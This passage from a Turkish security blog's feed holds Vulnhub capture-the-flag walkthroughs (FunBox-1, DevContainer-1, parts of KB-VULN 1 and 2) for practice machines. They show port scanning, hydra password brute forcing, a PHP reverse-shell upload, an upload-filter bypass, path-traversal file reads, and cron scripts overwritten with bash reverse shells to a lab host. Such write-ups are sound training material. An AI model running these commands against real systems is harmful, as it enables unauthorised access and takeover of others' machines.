    <img src="/images/vulnhub/kb-vuln2/preflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>User.txt deÄŸeri okunarak ilk flag elde edilir.</p>

    <img src="/images/vulnhub/kb-vuln2/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Kbadmin dizininde yer alan note.txt dosyasÄ± okunur. Yetki yÃ¼kseltilmesi ile ilgili docker kullanÄ±lmasÄ± yÃ¶nÃ¼nde bir ipucu olabilir.</p>

    <img src="/images/vulnhub/kb-vuln2/note.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ä°lk olarak wordpress admin panelinde elde edilen parola kbadmin kullanÄ±cÄ±sÄ± iÃ§in denenir.  <code>su kbadmin</code> BaÅŸarÄ±lÄ± bir ÅŸekilde kbadmin kullanÄ±cÄ±sÄ± ile oturum aÃ§Ä±lÄ±r. ğŸ™ˆ  <code>sudo -l</code> komutu ile kullanÄ±cÄ± yetkileri kontrol edilir.</p>

    <img src="/images/vulnhub/kb-vuln2/sudo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Kbadmin kullanÄ±cÄ±sÄ±na sudo iÅŸlemlerinde parola girmek ÅŸartÄ±yla sÄ±nÄ±rsÄ±z yetki verildiÄŸi gÃ¶rÃ¼lmektedir. <code>sudo su</code> komutu ile root kullanÄ±cÄ±sÄ±na geÃ§ilir. /root dizinine geÃ§ilerek flag deÄŸeri okunur.</p>

    <img src="/images/vulnhub/kb-vuln2/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULN FunBox-1 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vuln-funbox-1-write-up/</link>
            <pubDate>Tue, 22 Sep 2020 20:59:33 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vuln-funbox-1-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere VULNHUB &amp;lsquo;da yer alan FunBox-1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Ben Ã§Ã¶zerken keyif aldÄ±m umarÄ±m sizde okurken keyif alÄ±rsÄ±nÄ±z&amp;hellip; ğŸ˜Š
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
netdiscover -i eth1  Ä°p adresi tespit edildikten sonra nmap ile makinenin tÃ¼m portlarÄ± taranÄ±r. AÃ§Ä±k portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/funbox-1,518/">VULNHUB</a> &lsquo;da yer alan FunBox-1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Ben Ã§Ã¶zerken keyif aldÄ±m umarÄ±m sizde okurken keyif alÄ±rsÄ±nÄ±z&hellip; ğŸ˜Š</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/funbox1/discover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ä°p adresi tespit edildikten sonra nmap ile makinenin tÃ¼m portlarÄ± taranÄ±r. AÃ§Ä±k portlarda Ã§alÄ±ÅŸan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.106
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 07:04 CDT
Nmap scan report for 192.168.56.106 (192.168.56.106)
Host is up (0.00010s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://funbox.fritz.box/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message&quot;
|_    HY000
1 service unrecognized despite returning data. If you know the service/version,
....
MAC Address: 08:00:27:45:D6:F8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.87 seconds
</code></pre>

<div style="text-align:justify;">
<br>
Nmap taramasÄ±ndan gÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi site funbox.fritz.box adresine yÃ¶nlendirilmektedir. Ä°lk olarak /etc/hosts dosyasÄ±na <i style="color:yellow;">192.168.56.106  funbox.fritz.box </i>bilgisi eklenir. Daha sonra tarayÄ±cÄ±dan funbox.fritz.box istek atÄ±lÄ±r. AÃ§Ä±lan sayfada footer bÃ¶lÃ¼mÃ¼ne bakÄ±ldÄ±ÄŸÄ±nda sitenin Wordpress CMS uygulamasÄ± olduÄŸu gÃ¶rÃ¼lmektedir.
<br>
<br>
</div>

    <img src="/images/vulnhub/funbox1/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/vulnhub/funbox1/footer.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap taramasÄ±nda tespit edilen robots.txt dosyasÄ±na girilen /secret dizinine gidilir. Dizin iÃ§erisinde bir mesaj bÄ±rakÄ±lmÄ±ÅŸtÄ±r. ğŸ˜</p>

    <img src="/images/vulnhub/funbox1/secret.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Gobuster aracÄ± ile web dizin taramasÄ± yapÄ±lÄ±r. Dizin ve alt dizin taramalarÄ± sonucunda iÅŸe yarar bir bilgi edinilememiÅŸtir. ğŸ˜•</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://funbox.fritz.box/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
</code></pre></div>
    <img src="/images/vulnhub/funbox1/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Wordpress&rsquo;e Ã¶zel araÃ§ olan <strong>wpscan</strong> ile tarama gerÃ§eleÅŸtirilir. Admin paneli, kullanÄ±cÄ± adlarÄ± ve parola bilgileri elde edinilmeye Ã§alÄ±ÅŸÄ±lÄ±r. Tarama sonucunda <em>admin</em> ve <em>joe</em> adÄ±nda iki kullanÄ±cÄ± adÄ± tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://funbox.fritz.box/ --enumerate
</code></pre></div>
    <img src="/images/vulnhub/funbox1/wpscan.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Elde edinilen kullanÄ±cÄ± adlarÄ± ile ssh ve ftp servislerine hydra aracÄ± ile brute force saldÄ±rÄ±sÄ± yapÄ±lÄ±r. Her iki serviste de saldÄ±rÄ± sonucunda <strong>joe</strong> kullanÄ±cÄ±sÄ±na ait parola bilgisi elde edilir. Bu aÅŸamadan sonra ftp portundan devam edilmektedir. (Ssh servisine saldÄ±rmak sonradan aklÄ±ma geldi ğŸ¥º) Ssh baÄŸlantÄ±sÄ± alÄ±narak da devam edilebilmektedir.</p>
<pre><code class="language-terminal" data-lang="terminal">hydra -l joe -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.106
</code></pre>
    <img src="/images/vulnhub/funbox1/ftp.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<pre><code class="language-terminal" data-lang="terminal">hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.106
</code></pre>
    <img src="/images/vulnhub/funbox1/ssh.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Ftp servisine baÄŸlanÄ±lÄ±r. Shell almak iÃ§in web uygulamasÄ±nÄ±n yer aldÄ±ÄŸÄ± <em><strong>/var/www/html</strong></em> dizini geÃ§ilir, reverse shell almak iÃ§in <strong>joe</strong> kullanÄ±cÄ±sÄ± yetkilerinde olan secret klasÃ¶rÃ¼ne dosya yÃ¼klenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ftp 192.168.56.106
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Connected to 192.168.56.106.
220 ProFTPD Server (Debian) [::ffff:192.168.56.106]
Name (192.168.56.106:barcode): joe
331 Password required for joe
Password:
230 User joe logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; cd /var/www/html
250 CWD command successful
ftp&gt; ls -lsa
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxrwx   6 www-data www-data     4096 Jul 18 10:12 .
drwxr-xr-x   4 root     root         4096 Jun 19 11:18 ..
-rwxrwxrwx   1 www-data www-data    10918 Jun 19 11:16 default.htm
-rwxrwxrwx   1 www-data www-data      405 Jul 17 16:02 index.php
-rwxrwxrwx   1 www-data www-data    19915 Jul 17 16:02 license.txt
-rwxrwxrwx   1 www-data www-data     7278 Jul 17 16:02 readme.html
-rw-rw-r--   1 joe      joe            19 Jul 18 10:12 robots.txt
drwxrwxr-x   2 joe      joe          4096 Jul 18 10:05 secret
-rwxrwxrwx   1 www-data www-data     6912 Jul 17 16:02 wp-activate.php
drwxrwxrwx   9 www-data www-data     4096 Jul 17 16:02 wp-admin
-rwxrwxrwx   1 www-data www-data      351 Jul 17 16:02 wp-blog-header.php
-rwxrwxrwx   1 www-data www-data     2332 Jul 17 16:02 wp-comments-post.php
-rwxrwxrwx   1 www-data www-data     3047 Jun 19 11:28 wp-config.php
-rwxrwxrwx   1 www-data www-data     2913 Jul 17 16:02 wp-config-sample.php
drwxrwxrwx   6 www-data www-data     4096 Jul 18 08:44 wp-content
-rwxrwxrwx   1 www-data www-data     3940 Jul 17 16:02 wp-cron.php
drwxrwxrwx  21 www-data www-data    12288 Jul 17 16:02 wp-includes
-rwxrwxrwx   1 www-data www-data     2496 Jul 17 16:02 wp-links-opml.php
-rwxrwxrwx   1 www-data www-data     3300 Jul 17 16:02 wp-load.php
-rwxrwxrwx   1 www-data www-data    47874 Jul 17 16:02 wp-login.php
-rwxrwxrwx   1 www-data www-data     8509 Jul 17 16:02 wp-mail.php
-rwxrwxrwx   1 www-data www-data    19396 Jul 17 16:02 wp-settings.php
-rwxrwxrwx   1 www-data www-data    31111 Jul 17 16:02 wp-signup.php
-rwxrwxrwx   1 www-data www-data     4755 Jul 17 16:02 wp-trackback.php
-rwxrwxrwx   1 www-data www-data     3133 Jul 17 16:02 xmlrpc.php
226 Transfer complete
ftp&gt; cd secret
250 CWD command successful
ftp&gt; put reverse.php
local: reverse.php remote: reverse.php
200 PORT command successful
150 Opening BINARY mode data connection for reverse.php
226 Transfer complete
3475 bytes sent in 0.00 secs (11.3494 MB/s)
ftp&gt; ls -lsa
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 joe      joe          4096 Sep 22 13:59 .
drwxrwxrwx   6 www-data www-data     4096 Jul 18 10:12 ..
-rw-rw-r--   1 joe      joe            30 Jul 18 10:05 index.html
-rw-r--r--   1 joe      joe          3475 Sep -22 13:59 reverse.php
226 Transfer complete
</code></pre><p>Netcat ile 4444 numaralÄ± port dinlenmeye baÅŸlanÄ±r ve tarayÄ±cÄ±ndan <a href="http://funbox.fritz.box/secret/reverse.php">http://funbox.fritz.box/secret/reverse.php</a> istek atÄ±lÄ±rak terminal baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>

    <img src="/images/vulnhub/funbox1/firstac.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>www-data kullanÄ±sÄ±ndan <code>su joe </code> komutu ve ftp servisinde kullanÄ±lan parola bilgisi kullanÄ±larak joe kullanÄ±cÄ±sÄ±na yetki yÃ¼kseltilir.</p>

    <img src="/images/vulnhub/funbox1/firstpriv.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Home dizinine geÃ§ilerek diÄŸer kullanÄ±cÄ±lara bakÄ±ldÄ±ÄŸÄ±nda <strong>funny</strong> kullanÄ±sÄ±na ait klasÃ¶r gÃ¶rÃ¼lmektedir. KlasÃ¶r joe kullanÄ±cÄ±sÄ±nÄ± eriÅŸime aÃ§Ä±ktÄ±r. KlasÃ¶r iÃ§eriÄŸi listelenir.</p>

    <img src="/images/vulnhub/funbox1/funnyhome.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Dizinde yer alan sh uzantÄ±lÄ± dosyalar gÃ¶rÃ¼ntÃ¼lenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat .backup.sh 
<span style="color:#75715e">#!/bin/bash</span>
tar -cf /home/funny/html.tar /var/www/html

cat .reminder.sh 
<span style="color:#75715e">#!/bin/bash</span>
echo <span style="color:#e6db74">&#34;Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run.&#34;</span> | mail -s<span style="color:#e6db74">&#34;Reminder&#34;</span> joe@funbox
</code></pre></div><p><strong>.backup.sh</strong> dosyasÄ± web dizininde yer alan dosyalarÄ±n yedeklerini almaktadÄ±r. Sistem hakkÄ±nda daha fazla bilgi toplamak iÃ§in <a href="https://github.com/rebootuser/LinEnum">LinEnum BetiÄŸi</a> kullanÄ±lÄ±r. SonuÃ§lar incelendiÄŸinde .backup.sh dosyasÄ±nÄ±n funny kullanÄ±cÄ±sÄ±nÄ±n cron gÃ¶revi olduÄŸu gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/funbox1/cron.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>AyrÄ±ca funny kullanÄ±cÄ±sÄ±nÄ±n yÃ¼ksek yetkili kullanÄ±cÄ± olduÄŸu tespit edilmektedir.</p>

    <img src="/images/vulnhub/funbox1/yetki.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Sistemde Ã§alÄ±ÅŸan cron servisinin hangi kullanÄ±cÄ± yetkisinde Ã§alÄ±ÅŸtÄ±ÄŸÄ± incelenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ps aux | grep cron
</code></pre></div>
    <img src="/images/vulnhub/funbox1/ps.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Cron uygulamasÄ± root yetkisinde Ã§alÄ±ÅŸmaktadÄ±r. .backup.sh dosyasÄ± iÃ§eriÄŸinde yer alan komutlar funny kullanÄ±cÄ±sÄ±nÄ±n ile Ã§alÄ±ÅŸacaktÄ±r. Funny kullanÄ±cÄ±sÄ± sudo yetkisine sahiptir. Bu nedenle komutlar sudo ile verildiÄŸinde root  yetkisinde Ã§alÄ±ÅŸmaktadÄ±r. Dosya aÅŸaÄŸÄ±daki gibi dÃ¼zenlenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;sudo bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.56.105/7776 &lt;&amp;1&#39;&#34;</span> &gt; .backup.sh
</code></pre></div><p>nc ile 7776 numaralÄ± port dinlenir ve kÄ±sa bir sÃ¼re otomatik baÄŸlantÄ± gerÃ§ekleÅŸmektedir. Root dizini altÄ±ndaki flag deÄŸerine ulaÅŸÄ±larak Ã§Ã¶zÃ¼mleme tamamlanÄ±r.</p>
<p>
    <img src="/images/vulnhub/funbox1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">Yetki yÃ¼kseltme aÅŸamasÄ± biraz zaman alsa da Ã§Ã¶zÃ¼lmeye deÄŸer bir makinaydÄ±. ğŸ¤—
</div>

    <img src="/images/vulnhub/funbox1/finally.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />

</p>
]]></content>
        </item>
        
        <item>
            <title>VULN DevContainer-1 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vuln-devcontainer-1-write-up/</link>
            <pubDate>Mon, 21 Sep 2020 22:53:05 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vuln-devcontainer-1-write-up/</guid>
            <description>&amp;ldquo;Merhaba, Bu yazÄ±mda sizlere VULNHUB &amp;lsquo;da yer alan medium seviye DevContainer-1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip;&amp;rdquo;
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.  netdiscover -i eth1  Ip adresi tespit edildikten sonra nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.
TarayÄ±cÄ± ile web servisine istek atÄ±lÄ±r.</description>
            <content type="html"><![CDATA[<p>&ldquo;Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/devcontainer-1,548/">VULNHUB</a> &lsquo;da yer alan medium seviye DevContainer-1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip;&rdquo;</p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>


<div style="text-align:justify;">
Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
</div>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/devcontainer1/discover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ip adresi tespit edildikten sonra nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.</p>

    <img src="/images/vulnhub/devcontainer1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
TarayÄ±cÄ± ile web servisine istek atÄ±lÄ±r. AÃ§Ä±lan sayfa ve kaynak kodlarÄ± incelendiÄŸinde olaÄŸan dÄ±ÅŸÄ± bir bilgiye gÃ¶rÃ¼lmemektedir.
<br>
<br>
</div>

    <img src="/images/vulnhub/devcontainer1/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Gobuster aracÄ± ile Web dizin taramasÄ± gerÃ§ekleÅŸtirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.104/ -w /usr/share/wordlists/dirb/big.txt 
</code></pre></div>
    <img src="/images/vulnhub/devcontainer1/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Upload</strong> dizini dikkat Ã§ekmektedir. TarayÄ±cÄ±dan istek atÄ±ldÄ±ÄŸÄ±nda upload sayfasÄ± karÅŸÄ±lamaktadÄ±r. Ä°zin verilen dosya uzantÄ±larÄ± ekranda yazÄ±lmaktadÄ±r.</p>

    <img src="/images/vulnhub/devcontainer1/upload.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Burpsuite uygulamasÄ± aÃ§Ä±lÄ±r ve normal bir resim dosyasÄ± yÃ¼klendiÄŸinde giden istek incelenir.</p>

    <img src="/images/vulnhub/devcontainer1/normal.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Php uzantÄ±lÄ± dosya yÃ¼klendiÄŸinde giden isteÄŸin <em><strong>Content-type</strong></em> deÄŸeri <em><strong>image/gif</strong></em> ÅŸeklinde deÄŸiÅŸtirilerek deneme yapÄ±lÄ±r. YÃ¼kleme iÅŸlemi baÅŸarÄ±lÄ± bir ÅŸekilde gerÃ§ekleÅŸmektedir.</p>

    <img src="/images/vulnhub/devcontainer1/son.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Ä°lgili port dinlenmeye alÄ±narak upload ekranÄ±nda yer alan index yazÄ±sÄ±na tÄ±klanarak yÃ¼klenen dosya Ã§aÄŸÄ±rÄ±lÄ±r ve reverse shell alÄ±nÄ±r.</p>

    <img src="/images/vulnhub/devcontainer1/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/etc/passwd</strong></em> dosyasÄ± gÃ¶rÃ¼ntÃ¼lenerek sistemdeki kullanÄ±lar tespit edilir. Login olabilecek kullanÄ±cÄ± gÃ¶zÃ¼kmemektedir. Bu durumda bir container iÃ§erisinde olduÄŸumuz tespit edilir.</p>

    <img src="/images/vulnhub/devcontainer1/etc.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Web uygulamasÄ±nÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± <em><strong>/var/www/html</strong></em> dizine geÃ§ilir.</p>

    <img src="/images/vulnhub/devcontainer1/dizin.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Maintenance-Web-Docker</strong> dizini dikkat Ã§ekmektedir. Dizine girilerek iÃ§erisinde yer alan alan dosyalar incelenir.</p>

    <img src="/images/vulnhub/devcontainer1/webdocker.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<pre><code class="language-terminal" data-lang="terminal">cat maintenance.sh

#!/bin/bash
#Version 1.0
#This script monitors the uploaded files. It is a reverse shell monitoring measure.
#path= /home/richard/web/webapp/upload/files/
/home/richard/web/Maintenance-Web-Docker/list.sh


cat list.sh

#!/bin/bash
date &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
ls /home/richard/web/upload/files/ | wc -l &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
</code></pre><p>Dockerda yer alan <strong>www</strong> dizini ile <strong>/home/richard/web/</strong> dizini birbirine volume oluÅŸturularak baÄŸlanmÄ±ÅŸtÄ±r. List.sh dosyasÄ± shell alÄ±nacak ÅŸekilde dÃ¼zenir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -i &amp;&gt;/dev/tcp/192.168.56.105/7777 0&gt;&amp;1&#34;</span> &gt; list.sh
</code></pre></div><p>7777 numaralÄ± port dinlenir ve baÄŸlantÄ± saÄŸlanÄ±r.</p>

    <img src="/images/vulnhub/devcontainer1/rev.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>User.txt dosyasÄ± okunarak ilk aÅŸama tamamlanÄ±r.</p>

    <img src="/images/vulnhub/devcontainer1/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Sudo -l komutu ile yetkiler kontrol edilir.</p>

    <img src="/images/vulnhub/devcontainer1/sudo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Parola gerektirmeden root yetkisi ile socat uygulamasÄ±nÄ±n Ã§alÄ±ÅŸtÄ±rÄ±labildiÄŸi gÃ¶rÃ¼lmektedir. <strong>TCP-LISTEN 8080</strong> ile 8080 portuna gelen baÄŸlantÄ±lar dinlenir, <strong>fork</strong> ile gelen baÄŸlantÄ±lar 90 portuna yÃ¶nlendirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u root /home/richard/HackTools/socat TCP-LISTEN<span style="color:#ae81ff">\:</span>8080<span style="color:#ae81ff">\,</span>fork TCP<span style="color:#ae81ff">\:</span>127.0.0.1<span style="color:#ae81ff">\:</span><span style="color:#ae81ff">90</span>
</code></pre></div><p>Komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda 8080 portu gelen baÄŸlantÄ±lar iÃ§in dinlenmeye baÅŸlanÄ±r. TarayÄ±cÄ±dan <em>http://makianaipsi:8080</em> istek atÄ±ldÄ±ÄŸÄ±nda web sayfasÄ± aÃ§Ä±lÄ±r.</p>

    <img src="/images/vulnhub/devcontainer1/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Sayfada yer alan linklere tÄ±klandÄ±ÄŸÄ±nda lfi aÃ§Ä±ÄŸÄ± olabileceÄŸi tespit edilir.</p>

    <img src="/images/vulnhub/devcontainer1/lfi.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>view=../../../../../../etc/passwd</strong></em> parametre girilerek lfi aÃ§Ä±ÄŸÄ± varlÄ±ÄŸÄ± tespit edilir. GÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi include iÅŸlemi baÅŸarÄ±lÄ± gerÃ§ekleÅŸmiÅŸ ve passwd dosyasÄ± okunmuÅŸtur.</p>

    <img src="/images/vulnhub/devcontainer1/passwd.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ä°lk etapta upload ettiÄŸimiz shell dosyasÄ± <strong>../upload/files</strong> klasÃ¶rÃ¼ altÄ±ndadÄ±r. O dosya tekrar Ã§aÄŸÄ±rÄ±larak baÄŸlantÄ± alÄ±nÄ±r.</p>

    <img src="/images/vulnhub/devcontainer1/shell2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>/root dizinine geÃ§ilir ve dizin listenir ve Ã§Ã¶zÃ¼m tamamlanÄ±r.</p>

    <img src="/images/vulnhub/devcontainer1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB KB VULN:1 MakinasÄ± Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vulnhub-kb-vuln1-makinas%C4%B1-write-up/</link>
            <pubDate>Thu, 17 Sep 2020 20:40:54 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-kb-vuln1-makinas%C4%B1-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere VULNHUB &amp;lsquo;da yer alan medium seviye KB-VULN: 1 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip;
